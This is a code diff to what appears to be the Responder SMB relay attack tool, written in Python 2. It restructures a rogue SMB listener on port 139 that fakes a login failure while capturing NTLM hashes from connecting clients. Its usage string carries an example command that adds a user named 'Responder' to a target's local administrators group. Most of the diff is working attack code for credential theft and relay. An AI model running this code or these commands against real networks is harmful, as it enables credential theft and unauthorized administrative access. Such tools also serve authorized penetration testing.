@@ -29,7 +29,7 @@ def UserCallBack(op, value, dmy, parser):
                 args.extend(getattr(parser.values, op.dest))
         setattr(parser.values, op.dest, args)
 
-parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -r ",
+parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin",
                                prog=sys.argv[0],
                                )
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
@@ -38,7 +38,7 @@ parser.add_option('-c',action='store', help='Command to run on the target.',meta
 
 parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
 
-parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials.",metavar="WORKGROUP",dest="Domain")
+parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials. Woks on NTLMv1",metavar="WORKGROUP",dest="Domain")
 
 parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")
 
@@ -198,43 +198,48 @@ def Parse_Nego_Dialect(data):
        return "\x0a\x00"
 
 def SmbRogueSrv139(key,Target,DomainMachineName):
-   try:
-     s = socket(AF_INET,SOCK_STREAM)
-     s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
-     s.bind(('0.0.0.0', 139))
-     s.listen(0)
-     s.settimeout(30)
-     conn, addr = s.accept()
-     while True:
-      data = conn.recv(1024)
-      ##session request 139
-      if data[0] == "\x81":
-         buffer0 = "\x82\x00\x00\x00"         
-         conn.send(buffer0)
-      ##Negotiate proto answer.
-      if data[8:10] == "\x72\x00":
-         head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data))
-         t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key,Domain=DomainMachineName)
-         t.calculate()
-         packet1 = str(head)+str(t)
-         buffer1 = longueur(packet1)+packet1
-         conn.send(buffer1)
-         ##Session Setup AndX Request
-      if data[8:10] == "\x73\x00":
-         if Is_Anonymous(data):
-            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-            packet1 = str(head)+str(SMBSessEmpty())
-            buffer1 = longueur(packet1)+packet1  
+    s = socket(AF_INET,SOCK_STREAM)
+    s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
+    s.settimeout(30)
+    try:
+       s.bind(('0.0.0.0', 139))
+       s.listen(0)
+       conn, addr = s.accept()
+    except error, msg:
+       if "Address already in use" in msg:
+          print '\033[31m'+'Something is already listening on TCP 139, did you set SMB = Off in Responder.conf..?\nSMB Relay will not work.'+'\033[0m'
+       
+    try:
+       while True:
+         data = conn.recv(1024)
+         ##session request 139
+         if data[0] == "\x81":
+            buffer0 = "\x82\x00\x00\x00"         
+            conn.send(buffer0)
+         ##Negotiate proto answer.
+         if data[8:10] == "\x72\x00":
+            head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data))
+            t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key,Domain=DomainMachineName)
+            t.calculate()
+            packet1 = str(head)+str(t)
+            buffer1 = longueur(packet1)+packet1
             conn.send(buffer1)
-         else:
-            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-            packet1 = str(head)+str(SMBSessEmpty())#Return login fail anyways.
-            buffer1 = longueur(packet1)+packet1  
-            conn.send(buffer1)
-            Credz = ParseHash(data,addr[0],Target)
-            return Credz
-   except:
-      return None
+            ##Session Setup AndX Request
+         if data[8:10] == "\x73\x00":
+            if Is_Anonymous(data):
+               head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+               packet1 = str(head)+str(SMBSessEmpty())
+               buffer1 = longueur(packet1)+packet1  
+               conn.send(buffer1)
+            else:
+               head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+               packet1 = str(head)+str(SMBSessEmpty())#Return login fail anyways.
+               buffer1 = longueur(packet1)+packet1  
+               conn.send(buffer1)
+               Credz = ParseHash(data,addr[0],Target)
+               return Credz
+    except:
+       return None
 
 def RunRelay(host, Command,Domain):
     Target = host
@@ -418,6 +423,7 @@ def RunRelay(host, Command,Domain):
                                         return True
                                      if data[8:10] != "\x2e\x00":
                                         return False
+
 
 def RunInloop(Target,Command,Domain):
    try:
